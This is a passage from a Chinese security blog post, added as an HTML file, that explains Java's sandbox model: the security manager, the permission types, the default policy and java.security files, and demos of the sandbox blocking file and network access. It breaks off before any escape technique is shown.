@@ -1,0 +1,901 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,沙箱逃逸,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析Java沙箱逃逸 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析Java沙箱逃逸
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-05-03T08:11:24.000Z">
+        2020-05-03
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/沙箱逃逸/">沙箱逃逸</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-Java沙箱"><a href="#0x01-Java沙箱" class="headerlink" title="0x01 Java沙箱"></a>0x01 Java沙箱</h2><p>程序员编写一个Java程序，默认的情况下可以访问该机器的任意资源，比如读取、删除一些文件或者网络操作等。当你把程序部署到正式的服务器上，系统管理员要为服务器的安全承担责任，那么他可能不敢确定你的程序会不会访问不该访问的资源，为了消除潜在的安全隐患，他可能有两种办法：</p>
+<ol>
+<li><p>让你的程序在一个限定权限的帐号下运行。</p>
+</li>
+<li><p>利用Java的沙箱机制来限定你的程序不能为非作歹。以下用于介绍该机制。</p>
+</li>
+</ol>
+<h3 id="Java沙箱简介"><a href="#Java沙箱简介" class="headerlink" title="Java沙箱简介"></a>Java沙箱简介</h3><p>Java安全模型的核心就是Java沙箱（sandbox），什么是沙箱？沙箱是一个限制程序运行的环境。限制程序运行一方面是为了保护系统资源，同时另一方面也为了保护程序自己。沙箱主要限制系统资源访问，那系统资源包括什么？——CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也可以不一样。</p>
+<p>所有的Java程序运行都可以指定沙箱，可以定制安全策略。</p>
+<h3 id="Java中的安全模型"><a href="#Java中的安全模型" class="headerlink" title="Java中的安全模型"></a>Java中的安全模型</h3><p>在Java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的Java实现中，安全依赖于沙箱 (Sandbox) 机制。如下图：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/1.png" alt=""></p>
+<p>但如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的 Java1.1 版本中，针对安全机制做了改进，增加了安全策略，允许用户指定代码对本地资源的访问权限。如下图：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/2.png" alt=""></p>
+<p>在 Java1.2 版本中，再次改进了安全机制，增加了代码签名。不论本地代码或是远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/3.png" alt=""></p>
+<p>当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/4.png" alt=""></p>
+<p>以上提到的都是基本的Java安全模型概念，在应用开发中还有一些关于安全的复杂用法，其中最常用到的API就是doPrivileged()。doPrivileged()方法能够使一段受信任代码获得更大的权限，甚至比调用它的应用程序还要多，可做到临时访问更多的资源。有时候这是非常必要的，可以应付一些特殊的应用场景。例如，应用程序可能无法直接访问某些系统资源，但这样的应用程序必须得到这些资源才能够完成功能。</p>
+<h3 id="Java沙箱的基本组成"><a href="#Java沙箱的基本组成" class="headerlink" title="Java沙箱的基本组成"></a>Java沙箱的基本组成</h3><p>Java沙箱由以下几部分组成：</p>
+<ul>
+<li>字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但是不是所有的类文件都会经过字节码校验，比如核心类。</li>
+<li>类加载器（class loader）：所有的Java类都是通过类加载器加载的，可以自定义类加载器来设置加载类的权限。</li>
+<li>存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。</li>
+<li>安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。</li>
+<li>安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括：<ul>
+<li>安全提供者</li>
+<li>消息摘要</li>
+<li>数字签名</li>
+<li>加密</li>
+<li>鉴别</li>
+</ul>
+</li>
+</ul>
+<p>其中ClassLoader在如下三个方面对Java沙箱起作用：</p>
+<ol>
+<li>它防止恶意代码去干涉善意的代码；</li>
+<li>它守护了被信任的类库边界；</li>
+<li>它将代码归入保护域，确定了代码可以进行哪些操作。</li>
+</ol>
+<p>虚拟机为不同的ClassLoader载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个ClassLoader维护的，它们互相之间甚至不可见。</p>
+<p>ClassLoader采用的机制是双亲委派模式。从最内层JVM自带ClassLoader开始加载，外层恶意同名类得不到加载从而无法使用；由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。</p>
+<h3 id="Java沙箱的要素"><a href="#Java沙箱的要素" class="headerlink" title="Java沙箱的要素"></a>Java沙箱的要素</h3><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>权限是指允许代码执行的操作。包含三部分：权限类型、权限名和允许的操作。权限类型是实现了权限的Java类名，是必需的。权限名一般就是对哪类资源进行操作的资源定位（比如一个文件名或者通配符、网络主机等），一般基于权限类型来设置，有的比如java.security.AllPermission不需要权限名。允许的操作也和权限类型对应，指定了对目标可以执行的操作行为，比如读、写等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">permission java.security.AllPermission;    <span class="comment">//权限类型</span></span><br><span class="line">permission java.lang.RuntimePermission <span class="string">"stopThread"</span>;    <span class="comment">//权限类型+权限名</span></span><br><span class="line">permission java.io.FilePermission <span class="string">"/tmp/foo"</span> <span class="string">"read"</span>;    <span class="comment">//权限类型+权限名+允许的操作</span></span><br></pre></td></tr></table></figure>
+<p> 标准权限如下表：</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>类型</th>
+<th>权限名</th>
+<th>操作</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件权限</td>
+<td>java.io.FilePermission</td>
+<td>文件名（平台依赖）</td>
+<td>读、写、删除、执行</td>
+<td>允许所有文件的读写删除执行：permission java.io.FilePermission “&lt;&lt; ALL FILES&gt;&gt;”, “read,write,delete,execute”;。允许对用户主目录的读：permission java.io.FilePermission “${user.home}/-“, “read”;</td>
+</tr>
+<tr>
+<td>套接字权限</td>
+<td>java.net.SocketPermission</td>
+<td>主机名:端口</td>
+<td>接收、监听、连接、解析</td>
+<td>允许实现所有套接字操作：permission java.net.SocketPermission “:1-“, “accept,listen,connect,resolve”;。允许建立到特定网站的连接：permission java.net.SocketPermission “.abc.com:1-“, “connect,resolve”;</td>
+</tr>
+<tr>
+<td>属性权限</td>
+<td>java.util.PropertyPermission</td>
+<td>需要访问的jvm属性名</td>
+<td>读、写</td>
+<td>读标准Java属性：permission java.util.PropertyPermission “java.”, “read”;。在sdo包中创建属性：permission java.util.PropertyPermission “sdo.”, “read,write”;</td>
+</tr>
+<tr>
+<td>运行时权限</td>
+<td>java.lang.RuntimePermission</td>
+<td>多种权限名[见附录A]</td>
+<td>无</td>
+<td>允许代码初始化打印任务：permission java.lang.RuntimePermission “queuePrintJob”</td>
+</tr>
+<tr>
+<td>AWT权限</td>
+<td>java.awt.AWTPermission</td>
+<td>6种权限名[见附录B]</td>
+<td>无</td>
+<td>允许代码充分使用robot类：permission java.awt.AWTPermission “createRobot”; permission java.awt.AWTPermission “readDisplayPixels”;</td>
+</tr>
+<tr>
+<td>网络权限</td>
+<td>java.net.NetPermission</td>
+<td>3种权限名[见附录C]</td>
+<td>无</td>
+<td>允许安装流处理器：permission java.net.NetPermission “specifyStreamHandler”;。</td>
+</tr>
+<tr>
+<td>安全权限</td>
+<td>java.security.SecurityPermission</td>
+<td>多种权限名[见附录D]</td>
+<td>无</td>
+<td></td>
+</tr>
+<tr>
+<td>序列化权限</td>
+<td>java.io.SerializablePermission</td>
+<td>2种权限名[见附录E]</td>
+<td>无</td>
+<td></td>
+</tr>
+<tr>
+<td>反射权限</td>
+<td>java.lang.reflect.ReflectPermission</td>
+<td>suppressAccessChecks（允许利用反射检查任意类的私有变量）</td>
+<td>无</td>
+<td></td>
+</tr>
+<tr>
+<td>完全权限</td>
+<td>java.security.AllPermission</td>
+<td>无（拥有执行任何操作的权限）</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<h4 id="代码源"><a href="#代码源" class="headerlink" title="代码源"></a>代码源</h4><p>代码源是类所在的位置，表示为URL地址。</p>
+<h4 id="保护域"><a href="#保护域" class="headerlink" title="保护域"></a>保护域</h4><p>保护域用来组合代码源和权限，这是沙箱的基本概念。保护域就在于声明了比如由代码A可以做权限B这样的事情。</p>
+<h4 id="策略文件"><a href="#策略文件" class="headerlink" title="策略文件"></a>策略文件</h4><p>策略文件是控制沙箱的管理要素，一个策略文件包含一个或多个保护域的项。策略文件完成了代码权限的指定任务，策略文件包括全局和用户专属两种。</p>
+<p>JVM可以使用多个策略文件，不过一般来说下面两个最为常用。一个是全局的<code>$JREHOME/lib/security/java.policy</code>，作用于JVM的所有实例；另一个是用户自己的，可以存储到用户的主目录下。策略文件可以使用JDK自带的policytool工具编辑。</p>
+<h5 id="java-policy"><a href="#java-policy" class="headerlink" title="java.policy"></a>java.policy</h5><p>我们看下默认的java.policy文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// Standard extensions get all permissions by default</span><br><span class="line"></span><br><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">        permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// default permissions granted to all domains</span><br><span class="line"></span><br><span class="line">grant &#123;</span><br><span class="line">        // Allows any thread to stop itself using the java.lang.Thread.stop()</span><br><span class="line">        // method that takes no argument.</span><br><span class="line">        // Note that this permission is granted by default only to remain</span><br><span class="line">        // backwards compatible.</span><br><span class="line">        // It is strongly recommended that you either remove this permission</span><br><span class="line">        // from this policy file or further restrict it to code sources</span><br><span class="line">        // that you specify, because Thread.stop() is potentially unsafe.</span><br><span class="line">        // See the API specification of java.lang.Thread.stop() for more</span><br><span class="line">        // information.</span><br><span class="line">        permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line"></span><br><span class="line">        // allows anyone to listen on dynamic ports</span><br><span class="line">        permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;;</span><br><span class="line"></span><br><span class="line">        // &quot;standard&quot; properies that can be read by anyone</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.class.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.arch&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;file.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;path.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;line.separator&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.name&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>策略文件的内容格式就是这样，grant授权允许操作某个权限。这个默认的策略文件就指明了JDK扩展包可以有全部权限，允许代码stop线程，允许监听1099端口(1099号端口，是默认的服务器端RMI监听端口)等等。</p>
+<p><strong>配置基本原则：</strong></p>
+<p>在启用安全管理器的时候，配置遵循以下基本原则：</p>
+<ol>
+<li>没有配置的权限表示没有。</li>
+<li>只能配置有什么权限，不能配置禁止做什么。</li>
+<li>同一种权限可多次配置，取并集。</li>
+<li>统一资源的多种权限可用逗号分割。</li>
+</ol>
+<p><strong>默认配置文件解释：</strong></p>
+<p>第一部分授权：授权基于路径在<code>file:$/*</code>的class和jar包，所有权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>第二部分授权：这是细粒度的授权，对某些资源的操作进行授权。具体不再解释，可以查看javadoc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123; </span><br><span class="line">    permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line">    ……   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>补充</strong>：当批量配置的时候（例如第一部分授权），有三种模式：</p>
+<ul>
+<li><code>directory/</code>表示directory目录下的所有.class文件，不包括.jar文件；</li>
+<li><code>directory/*</code>表示directory目录下的所有的.class及.jar文件；</li>
+<li><code>directory/-</code>表示directory目录下的所有的.class及.jar文件，包括子目录；</li>
+</ul>
+<p>　　可以通过<code>${}</code>来引用系统属性，如： <code>file:$/*</code></p>
+<h5 id="java-security"><a href="#java-security" class="headerlink" title="java.security"></a>java.security</h5><p>另一个很重要的是参数文件——java.security，这个文件和策略文件在同一个目录下。这个参数文件定义了沙箱的一些参数。比如默认的沙箱文件是这样的，只截取部分内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br><span class="line"></span><br><span class="line"># whether or not we expand properties in the policy file</span><br><span class="line"># if this is set to false, properties ($&#123;...&#125;) will not be expanded in policy</span><br><span class="line"># files.</span><br><span class="line">policy.expandProperties=true</span><br><span class="line"></span><br><span class="line"># whether or not we allow an extra policy to be passed on the command line</span><br><span class="line"># with -Djava.security.policy=somefile. Comment out this line to disable</span><br><span class="line"># this feature.</span><br><span class="line">policy.allowSystemProperty=true</span><br></pre></td></tr></table></figure>
+<p><code>policy.url.*</code>这个属性指明了使用的策略文件，如上文所述，默认的两个位置就在这里配置，用户可以自行更改顺序和存储位置。而policy.allowSystemProperty指明是否允许用户自行通过命令行指定policy文件。</p>
+<h4 id="密钥库"><a href="#密钥库" class="headerlink" title="密钥库"></a>密钥库</h4><p>保存密钥证书的地方。</p>
+<h3 id="默认沙箱"><a href="#默认沙箱" class="headerlink" title="默认沙箱"></a>默认沙箱</h3><p>通过Java命令行启动的Java应用程序，默认不启用沙箱。要想启用沙箱，启动命令需要做如下形式的变更：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager &lt;other args&gt;</span><br></pre></td></tr></table></figure>
+<p>沙箱启动后，安全管理器会使用两个默认的策略文件来确定沙箱启动参数。当然也可以通过命令指定：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy=&lt;URL&gt;</span><br></pre></td></tr></table></figure>
+<p>如果要求启动时只遵循一个策略文件，那么启动参数要加个等号，如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy==&lt;URL&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Java沙箱的应用"><a href="#Java沙箱的应用" class="headerlink" title="Java沙箱的应用"></a>Java沙箱的应用</h3><h4 id="限制读文件"><a href="#限制读文件" class="headerlink" title="限制读文件"></a>限制读文件</h4><p>这个例子很简单，首先写一个r.txt文件，里面的内容是“abcd”，再写个程序如下读取这个r.txt。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">file</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"D:\\github\\CDLib\\src\\main\\resources\\security\\r.txt"</span>);</span><br><span class="line">        InputStream is;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">            <span class="keyword">byte</span>[] content = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (is.read(content) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="keyword">new</span> String(content));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test read file.</span></span><br><span class="line">        file();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现输出是<code>abcd</code>。</p>
+<p>接下来修改Java启动参数，加入<code>-Djava.security.manager</code>，启动了安全沙箱。再运行，输出变成了异常：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.security.AccessControlException: access denied (&quot;java.io.FilePermission&quot; &quot;D:\github\CDLib\src\main\resources\security\r.txt&quot; &quot;read&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkRead(Unknown Source)</span><br><span class="line">at java.io.FileInputStream.(Unknown Source)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:15)</span><br></pre></td></tr></table></figure>
+<p>这里已经提示了，访问被拒绝，说明了沙箱启动，同时也验证了默认沙箱——禁止本地文件访问。</p>
+<p>再来，我们构建一个custom.policy文件如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;D:\\github\\CDLib\\src\\main\\resources\\security\\*&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这里构建了一条安全策略——允许读取security目录下的文件。</p>
+<p>修改启动命令，添加<code>-Djava.security.policy=D:\\github\\CDLib\\src\\main\\resources\\security\\custom.policy</code>，再执行，结果输出了<code>abcd</code>。</p>
+<p>如上例。我们通过自定义policy文件修改了默认沙箱的安全策略，再通过启动参数开启沙箱模式。这样就可以构造我们自己想要的沙箱效果了。</p>
+<h4 id="限制访问网络"><a href="#限制访问网络" class="headerlink" title="限制访问网络"></a>限制访问网络</h4><p>通过HttpClient访问<code>www.baidu.com</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.taobao.cd.http.util.HttpUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">network</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String text = HttpUtil.createHtmlText(<span class="string">"http://www.baidu.com"</span>, HttpUtil.UA);</span><br><span class="line">            System.out.println(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test use network.</span></span><br><span class="line">        network();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开启默认沙箱后，输出如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">java.security.AccessControlException: access denied (&quot;java.net.SocketPermission&quot; &quot;www.baidu.com&quot; &quot;resolve&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkConnect(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName0(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.resolveHostname(DefaultClientConnectionOperator.java:242)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:130)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:149)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:121)</span><br><span class="line">at 